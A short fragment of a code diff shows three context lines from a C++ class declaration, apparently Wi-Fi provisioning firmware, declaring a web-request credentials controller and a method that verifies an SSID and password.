+@@ -94,6 +163,11 @@ private:
      void credsController(AsyncWebServerRequest *request);
  
      bool verifyCreds(String &Ssid, String &Password);
